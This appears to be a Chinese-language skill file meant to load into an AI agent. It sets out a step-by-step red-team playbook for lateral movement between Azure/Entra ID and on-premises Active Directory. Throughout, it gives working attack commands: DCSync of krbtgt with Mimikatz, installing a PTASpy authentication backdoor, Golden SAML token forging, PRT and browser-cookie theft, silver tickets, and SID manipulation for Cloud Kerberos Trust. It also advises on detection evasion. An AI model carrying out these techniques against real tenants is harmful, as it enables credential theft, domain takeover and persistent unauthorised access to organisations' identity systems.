---
name: azure-hybrid-lateral
description: "Azure Cloud 到本地 AD 的横向移动方法论。当已获取 Azure/Entra ID 权限并需要穿越到本地 Active Directory 环境、发现目标使用 Azure AD Connect/Cloud Sync/PTA/Federation 等混合身份架构、或需要利用 PRT/Certificate/Cookie 等凭据进行 Cloud-to-OnPrem 横向时使用。覆盖 14 种横向技术：Pass the PRT/Certificate/Cookie、Cloud Kerberos Trust、Connect Sync/Cloud Sync 凭据提取、PTA Agent 后门、Federation Token 伪造、Seamless SSO 银票、Exchange Hybrid 模拟、Arc GPO 部署脚本注入、本地云凭据提取"
metadata:
  tags: "azure,hybrid,lateral-movement,prt,pass-the-certificate,pass-the-cookie,cloud-kerberos-trust,azure-ad-connect,pta,federation,seamless-sso,横向移动,Cloud到OnPrem,混合身份"
  category: "cloud"
---

# Azure 混合身份横向移动方法论（Cloud <-> On-Prem）

在现代企业环境中，Azure/Entra ID 与本地 Active Directory 之间的混合身份架构极为普遍。这种架构在提供便利的同时，也创造了独特的攻击面——攻击者一旦控制了云端身份（Entra ID），便可借助同步服务、信任关系和凭据桥接机制穿越到本地 AD 环境，反之亦然。Cloud-to-OnPrem 横向移动是红队评估中最关键的攻击阶段之一，也是防御方最容易忽视的盲区。

**核心要点**：混合身份架构中的每一个同步组件（Connect Sync、Cloud Sync、PTA Agent、Federation）都是潜在的横向移动桥梁。攻击者需要首先识别目标使用的混合身份架构类型，然后选择对应的横向技术。

## 深入参考

识别到具体攻击集群后，加载对应参考文档获取完整技术细节：

- 身份同步类攻击（Connect Sync/Cloud Sync/PTA/Federation/Domain Services/Arc） → 读 [references/identity-sync-attacks.md](references/identity-sync-attacks.md)
- 令牌与凭据类攻击（PRT/Certificate/Cookie/Seamless SSO/Cloud Kerberos Trust/Exchange Hybrid） → 读 [references/token-credential-attacks.md](references/token-credential-attacks.md)

## 横向移动决策树

获取云端或本地权限后，按以下决策树选择可用的横向技术：

```
混合身份架构识别
├─ 检测到 Azure AD Connect Sync（MSOL_* 账户存在）
│   ├─ 已控制 Connect Sync 服务器 → Connect Sync 凭据提取（DCSync）
│   ├─ 有 Entra ID GA 权限 + Password Writeback 启用 → 云端重置 AD 密码
│   └─ 检测到 Seamless SSO（AZUREADSSOACC$ 存在） → 银票伪造访问云端
│       → 读 references/identity-sync-attacks.md
│
├─ 检测到 Cloud Sync（provAgentgMSA 账户存在）
│   ├─ 已控制 gMSA 密码读取权限 → Cloud Sync gMSA 提取 + DCSync
│   └─ AD 用户同步到 Entra ID → 修改密码等待同步
│       → 读 references/identity-sync-attacks.md
│
├─ 检测到 PTA Agent（Pass-through Authentication）
│   ├─ 已控制 PTA 服务器 → 安装 PTASpy 后门（拦截所有密码 + 允许任意密码）
│   └─ 有 GA 权限 → 注册恶意 PTA Agent
│       → 读 references/identity-sync-attacks.md
│
├─ 检测到 Federation（AD FS 服务器存在）
│   ├─ 已控制 AD FS 服务器 → 提取 Token Signing 证书 → Golden SAML
│   └─ 有 Exchange Hybrid → ACS Actor Token 模拟
│       → 读 references/identity-sync-attacks.md
│
├─ 检测到 Cloud Kerberos Trust（AzureADKerberos$ 存在）
│   ├─ 有 GA/Hybrid Identity Admin 权限 → 修改用户 SID → Partial TGT → Full TGT
│   └─ 目标 MSOL 账户 → DCSync 全域
│       → 读 references/token-credential-attacks.md
│
├─ 检测到 Domain Services（AAD DC Administrators 组存在）
│   ├─ 有 Entra ID 权限 → 添加用户到 AAD DC Administrators → RDP 接管
│   └─ 托管域 → 密码哈希同步利用
│       → 读 references/identity-sync-attacks.md
│
├─ 检测到 Arc GPO 部署（AzureArcDeploy 共享目录存在）
│   ├─ 可创建/控制 AD 机器账户 → 解密 SP 密钥 → 云端接管
│   └─ → 读 references/identity-sync-attacks.md
│
├─ 已控制设备（Azure AD Joined/Hybrid Joined）
│   ├─ 设备有 PRT → Pass the PRT（提取 + 构造 PRT Cookie）
│   ├─ 设备有 PRT + NegoEx → Pass the Certificate
│   ├─ 浏览器有 Azure 会话 → Pass the Cookie（ESTSAUTH/ESTSAUTHPERSISTENT）
│   └─ 设备有云端应用（Excel/Teams）→ 内存中提取 JWT Token
│       → 读 references/token-credential-attacks.md
│
└─ 已获取用户凭据（密码/哈希/TGT）
    ├─ 用户已同步到 Entra ID → 直接登录云端
    ├─ 有 AZUREADSSOACC$ 哈希 → Seamless SSO 银票
    └─ 有 KRBTGT 哈希 → Golden Ticket 后通过 Seamless SSO 访问云端
        → 读 references/token-credential-attacks.md
```

## 14 种横向技术总览

| # | 技术名称 | 方向 | 前置条件 | 所需权限 | 关键工具 | 隐蔽性 |
|---|---------|------|---------|---------|---------|--------|
| 1 | Connect Sync 凭据提取 | AD↔Cloud | Connect Sync 服务器访问 | 服务器本地管理员 | AADInternals, adconnectdump | 中 |
| 2 | Cloud Sync gMSA 提取 | AD→Cloud | Cloud Sync Agent 部署 | DC 机器账户哈希或 gMSA 读取权限 | DSInternals, Mimikatz | 中 |
| 3 | PTA Agent 后门 | Cloud→AD | PTA Agent 服务器访问 | 服务器本地管理员 | AADInternals (PTASpy) | 低 |
| 4 | Federation / Golden SAML | AD→Cloud | AD FS 服务器访问 | Domain Admin | ADFSDump, shimit, AADInternals | 高 |
| 5 | Domain Services | Cloud→AD | Domain Services 已部署 | Entra ID 用户管理权限 | Azure Portal/CLI | 低 |
| 6 | Arc GPO 脚本注入 | AD→Cloud | Arc GPO 部署共享可达 | AD 机器账户 | PowerShell (DPAPI-NG) | 中 |
| 7 | Pass the PRT | 设备→Cloud | Azure AD Joined 设备访问 | 本地管理员/用户 | Mimikatz, ROADtools, AADInternals | 高 |
| 8 | Pass the Certificate | 设备→设备 | PRT + NegoEx 支持 | PRT 提取权限 | PrtToCert, AzureADJoinedMachinePTC | 高 |
| 9 | Pass the Cookie | 浏览器→Cloud | 浏览器会话存在 | 用户级别（DPAPI 解密） | Mimikatz (dpapi::chrome) | 高 |
| 10 | Seamless SSO 银票 | AD→Cloud | Seamless SSO 启用 | AZUREADSSOACC$ 哈希 | Mimikatz, SeamlessPass, Rubeus | 高 |
| 11 | Cloud Kerberos Trust | Cloud→AD | Cloud Kerberos Trust 启用 | Global Admin / Hybrid Identity Admin | ROADtools Hybrid, Impacket | 高 |
| 12 | Exchange Hybrid 模拟 | AD→Cloud | Exchange Hybrid 部署 | Exchange 服务器访问 | 自定义 OAuth 工具 | 中 |
| 13 | 本地云凭据提取 | 设备→Cloud | 已入侵终端设备 | 本地管理员/用户 | WinPEAS, 手动搜索 | 高 |
| 14 | Hybrid Misc（强制同步等） | AD↔Cloud | 混合身份同步启用 | AD 用户属性修改权限 | PowerShell, AADInternals | 中 |

## 第一组：身份同步类攻击

### Connect Sync 凭据提取

Azure AD Connect Sync 在安装服务器上创建 `MSOL_<installationID>` 账户，该账户拥有本地 AD 的 DCSync（目录复制）权限。凭据以 DPAPI 加密方式存储在本地 SQL 数据库 `ADSync.mdf` 中。攻击者控制 Connect Sync 服务器后，可提取 MSOL 账户密码执行 DCSync 获取全域哈希。

```powershell
# 提取 Connect Sync 存储的凭据
Install-Module -Name AADInternals -RequiredVersion 0.9.0
Import-Module AADInternals
Get-AADIntSyncCredentials

# 使用 MSOL 账户执行 DCSync
runas /netonly /user:domain\MSOL_<id> cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```

**枚举**：搜索 `MSOL_*`、`Sync_*`、`ADSyncMSA*` 账户确认 Connect Sync 存在。

### Cloud Sync gMSA 凭据提取

Cloud Sync 使用 `provAgentgMSA` 组托管服务账户（gMSA），默认拥有 DCSync 权限。gMSA 密码通常仅允许 DC 机器账户读取。攻击者需先获取 DC 机器账户哈希，然后以其身份读取 gMSA 密码。

```powershell
# 枚举 gMSA 账户
Get-ADServiceAccount -Filter * -Server domain.local
# 获取 DC 机器账户哈希后读取 gMSA 密码
$Passwordblob = (Get-ADServiceAccount -Identity pGMSA_<id>$ -Properties msDS-ManagedPassword -server domain.local).'msDS-ManagedPassword'
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
```

### PTA Agent 后门

Pass-through Authentication Agent 从 Azure AD 队列中获取加密凭据并在本地 AD 验证。攻击者控制 PTA 服务器后，可安装后门拦截所有明文密码并允许任意密码通过验证（类似 Skeleton Key 攻击）。

```powershell
# 安装 PTASpy 后门
Install-AADIntPTASpy
# 读取拦截到的明文密码
Get-AADIntPTASpyLog -DecodePasswords
# 移除后门
Remove-AADIntPTASpy
```

**注意**：获取 GA 权限后可注册新的 PTA Agent 实现持久化。

### Federation / Golden SAML

AD FS 使用 Token Signing 证书签名 SAML Response。攻击者提取该私钥后可伪造任意用户的 SAML 令牌（Golden SAML），绕过密码和 MFA 认证。证书不会自动轮换，且修改用户密码不影响已生成的 SAML。

```powershell
# 从 AD FS 服务器导出 Token Signing 证书
Export-AADIntADFSSigningCertificate
# 使用 shimit 伪造 SAML Response
python shimit.py -idp http://adfs.domain.com/adfs/services/trust -pk key.pem -c cert.pem -u domain\admin -n admin@domain.com -r ADFS-admin -id 123456789012
```

### Domain Services

Microsoft Entra Domain Services 在 Azure 中部署托管 AD。`AAD DC Administrators` 组成员在域内 VM 上拥有本地管理员权限。攻击者只需将用户加入该组即可通过 RDP 接管域内所有 VM。

### Arc GPO 部署脚本注入

Azure Arc 通过 GPO 部署脚本将服务器接入 Azure，Service Principal 密钥使用 DPAPI-NG 加密存储在网络共享中。攻击者创建或控制 AD 机器账户后即可解密该密钥，以 Service Principal 身份访问 Azure。

```powershell
# 使用机器账户 TGT 解密 SP 密钥
Import-Module .\AzureArcDeployment.psm1
$encryptedSecret = Get-Content "\\share\AzureArcDeploy\encryptedServicePrincipalSecret"
$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
```

## 第二组：令牌与凭据类攻击

### Pass the PRT

Primary Refresh Token（PRT）是 Azure AD 设备上的长生命周期刷新令牌，类似于 Kerberos TGT。PRT 及其 Session Key 缓存在 LSASS 的 CloudAP 插件中。无 TPM 设备上可直接从内存提取；有 TPM 设备上可通过 BrowserCore COM 接口或 WAM API 间接获取 PRT Cookie。

```powershell
# 从 LSASS 提取 PRT 和 Session Key（无 TPM）
privilege::debug
sekurlsa::cloudap
token::elevate
dpapi::cloudapkd /keyvalue:<EncryptedKeyBlob> /unprotect
# 生成 PRT Cookie
dpapi::cloudapkd /context:<ContextHex> /derivedkey:<DerivedKeyHex> /prt:<PRT>
```

```bash
# 使用 roadtx 续期 PRT
roadtx prt -a renew --prt <PRT> --prt-sessionkey <clear_key>
roadtx browserprtauth
```

**非管理员路径**：通过 BrowserCore COM（`RequestAADRefreshToken.exe`）或 ROADtoken 在用户级别获取 PRT Cookie。

### Pass the Certificate

基于 PRT 向 Entra ID CA 请求用户 P2P 证书，然后使用该证书通过 NegoEx 认证访问其他 Azure AD Joined 机器。

```bash
# 请求 P2P 证书
RequestCert.py --tenantId <TenantID> --prt <PRT> --userName <User> --hexCtx <Ctx> --hexDerivedKey <Key>
# 使用证书访问远程机器
Main.py --usercert user.pfx --certpass <pass> --remoteip <target_ip>
```

### Pass the Cookie

从浏览器提取 Azure 认证 Cookie（`ESTSAUTH`、`ESTSAUTHPERSISTENT`），使用 DPAPI 解密后注入浏览器即可绕过 MFA 直接访问 Azure 资源。

```powershell
# 使用 Mimikatz 提取 Chrome Cookie
mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exit
# 将 ESTSAUTHPERSISTENT Cookie 注入浏览器 → 访问 login.microsoftonline.com
```

### Seamless SSO 银票

Seamless SSO 在 AD 中创建 `AZUREADSSOACC$` 计算机账户，其密码永不更换且以明文发送给 Entra ID。攻击者获取该账户哈希后可为任意同步用户伪造 Kerberos 银票访问云端资源。

```bash
# 提取 AZUREADSSOACC$ 哈希
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
# 使用 SeamlessPass 获取云端令牌
seamlesspass -tenant corp.com -adssoacc-ntlm <hash> -user-sid <SID>
# 或伪造银票
mimikatz.exe "kerberos::golden /user:<target> /sid:<domain_SID> /id:<RID> /domain:domain.local /rc4:<hash> /target:autologon.microsoftazuread-sso.com /service:HTTP /ptt" exit
```

**注意**：AZUREADSSOACC$ 密码永不更换，一次提取即可长期利用。银票不绕过 MFA。

### Cloud Kerberos Trust

当环境启用 Cloud Kerberos Trust 时，Entra ID 可为 AD 用户签发 Partial TGT。攻击者拥有 Global Admin 权限后，可通过 Sync API 修改混合用户的 `onPremisesSID` 指向高权限 AD 账户（如 MSOL 同步账户），然后获取 Partial TGT 并在 DC 上换取 Full TGT，最终执行 DCSync。

```bash
# 修改混合用户的 on-prem SID 指向目标账户
python3 modifyuser.py -u <GA_UPN> -p <Password> --sourceanchor <ImmutableID> --sid <Target_SID> --sam <Target_SAM>
# 获取 PRT 中的 Partial TGT
roadtx getprt -u <HybridUser> -p <Password> -d <DeviceID>
# 将 Partial TGT 换为 Full TGT + NTLM 哈希
python3 partialtofulltgt.py -p roadtx.prt -o full_tgt.ccache --extract-hash
# DCSync
secretsdump.py 'DOMAIN/<TargetSAM>$@<DC_IP>' -hashes :<NTLM_hash>
```

### Exchange Hybrid 模拟

旧版 Exchange Hybrid 设计中，本地 Exchange 可使用与 Exchange Online 相同的 Entra 应用身份。攻击者从 Exchange 服务器提取 Hybrid 证书私钥后，可通过 ACS Actor Token 模拟任意用户访问 Exchange Online 和 SharePoint/OneDrive。`graph.windows.net` 的模拟路径已被修补，但 Exchange/SharePoint 模拟在未完成身份分离迁移的环境中仍然有效。

### 本地云凭据提取

入侵终端设备后可从多个位置提取云端凭据：

| 位置 | 凭据类型 | 路径/方法 |
|------|---------|----------|
| Azure CLI | Access Token（明文） | `C:\Users\<user>\.Azure\accessTokens.json` |
| Azure PowerShell | Token Cache | `C:\Users\<user>\.Azure\TokenCache.dat` |
| Azure PowerShell | SP Secret（明文） | `C:\Users\<user>\.Azure\AzureRmContext.json` |
| 进程内存 | JWT Token（明文） | 转储 Excel/Teams 进程内存，grep `eyJ0` |
| 浏览器 | Session Cookie | DPAPI 解密浏览器 Cookie 存储 |

```bash
# 从进程内存提取 JWT Token
strings excel.dmp | grep 'eyJ0'
curl -s -H "Authorization: Bearer <token>" https://graph.microsoft.com/v1.0/me | jq
```

## 工具推荐

| 工具 | 用途 | 适用场景 |
|------|------|---------|
| AADInternals | Connect Sync/PTA/Seamless SSO/PRT 攻击 | 全场景混合身份攻击 |
| ROADtools (roadtx/roadrecon) | PRT 操作、Cloud Kerberos Trust、设备注册 | Cloud→OnPrem 穿越 |
| Mimikatz | PRT/Cookie/DPAPI/DCSync/银票 | 凭据提取与票据伪造 |
| Rubeus | Kerberos 票据操作、S4U、银票 | Seamless SSO/RBCD 攻击 |
| SeamlessPass | Seamless SSO 一键利用 | TGT/TGS/哈希→云端令牌 |
| adconnectdump | Connect Sync 凭据远程提取 | 远程 Connect Sync 攻击 |
| shimit | Golden SAML 伪造 | Federation 攻击 |
| Impacket | DCSync/secretsdump/getST/addcomputer | AD 核心攻击工具集 |
| PrtToCert | PRT→P2P 证书生成 | Pass the Certificate |
| ROADtoken | 用户级 PRT Cookie 获取 | 非管理员 PRT 利用 |
| DSInternals | gMSA 密码读取、NTDS.dit 解析 | Cloud Sync/Seamless SSO |
| WinPEAS | 自动化本地凭据搜索 | 本地云凭据发现 |

## 架构识别枚举命令

```powershell
# 检测 Connect Sync（从 AD 侧）
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description
Get-ADServiceAccount -Filter "SamAccountName -like 'ADSyncMSA*'"

# 检测 Cloud Sync（从 AD 侧）
Get-ADServiceAccount -Filter "ObjectClass -like 'msDS-GroupManagedServiceAccount'"

# 检测 Seamless SSO（从 AD 侧）
Get-ADComputer -Filter "SamAccountName -like 'AZUREADSSOACC$'"

# 检测 Cloud Kerberos Trust（从 AD 侧）
Get-ADComputer -Filter "SamAccountName -like 'AzureADKerberos$'"

# 检测 PTA Agent（从 Entra ID 侧）
az rest --url 'https://graph.microsoft.com/beta/onPremisesPublishingProfiles/authentication/agentGroups?$expand=agents'

# 检测 Cloud Sync Agent（从 Entra ID 侧）
az rest --method GET --uri "https://graph.microsoft.com/beta/onPremisesPublishingProfiles('provisioning')/agents/?\$expand=agentGroups"

# 检测同步配置（从 Entra ID 侧）
az rest --url "https://graph.microsoft.com/v1.0/directory/onPremisesSynchronization"

# 检测 Federation（从外部）
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -Domain <domain> | Format-Table
```

## 操作安全（OPSEC）

- **PTA 后门**：PTASpy 以 DLL 注入方式工作，重启服务后失效；在 `C:\PTASpy` 创建文件夹会留下文件系统痕迹
- **Connect Sync 凭据提取**：`Get-AADIntSyncCredentials` 需要本地管理员权限访问 SQL 数据库，操作本身不产生网络日志
- **Golden SAML**：Token Signing 证书不自动轮换，攻击者可长期伪造令牌；检测需监控 AD FS 证书导出事件
- **PRT 提取**：`sekurlsa::cloudap` 需要 SYSTEM 权限访问 LSASS，会触发 EDR/Sysmon 的 LSASS 访问告警
- **Seamless SSO 银票**：`AZUREADSSOACC$` 密码永不更换，一次提取后攻击者可无限期伪造银票
- **Cloud Kerberos Trust**：修改用户 onPremisesSID 会被下次同步周期自动还原，但攻击窗口足够完成 DCSync
- **Password Writeback**：修改 AD 用户密码会产生 Entra ID 审计日志；`adminCount=1` 的用户（Domain Admins 等）不受影响
- **GuardDuty 等效**：Azure 中对应的检测服务为 Microsoft Defender for Identity 和 Microsoft Sentinel，监控 DCSync、异常 Kerberos 票据请求等

## 交叉引用

- 参考 `azure-pentesting` 技能，获取 Azure 环境的整体攻击流程和初始访问方法
- 参考 `azure-ad-attack` 技能，获取 Entra ID 权限提升和持久化技术
